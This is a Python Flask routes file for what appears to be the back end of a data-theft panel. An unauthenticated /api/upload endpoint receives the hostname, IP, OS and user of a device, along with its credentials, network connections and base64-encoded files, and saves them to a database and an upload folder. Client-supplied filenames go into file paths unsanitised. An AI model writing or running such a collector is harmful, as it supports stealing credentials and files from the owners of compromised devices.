from flask import Blueprint, render_template, request, jsonify, current_app
from .models import db, Device, Credential, File, Network
import base64, os, uuid

main = Blueprint("main", __name__)

@main.route("/")
def index():
    devices = Device.query.all()
    return render_template("index.html", devices=devices)


@main.route("/device/<int:device_id>")
def device(device_id):
    device = Device.query.get_or_404(device_id)
    return render_template("device.html", device=device)


@main.route("/api/upload", methods=["POST"])
def upload():
    data = request.get_json()

    device = Device(
        hostname=data.get("hostname"),
        ip=data.get("ip"),
        os=data.get("os"),
        user=data.get("user")
    )

    db.session.add(device)
    db.session.commit()

    for cred in data.get("credentials", []):
        db.session.add(Credential(data=cred, device=device))

    for net in data.get("network", []):
        db.session.add(Network(connection=net, device=device))

    for f in data.get("files", []):
        filename = str(uuid.uuid4()) + "_" + f["filename"]
        file_bytes = base64.b64decode(f["data"])

        upload_folder = current_app.config["UPLOAD_FOLDER"]
        os.makedirs(upload_folder, exist_ok=True)

        filepath = os.path.join(upload_folder, filename)

        with open(filepath, "wb") as file:
            file.write(file_bytes)

        db.session.add(File(
            filename=filename,
            path=filepath,
            device=device
        ))

    db.session.commit()

    return jsonify({"status": "ok"})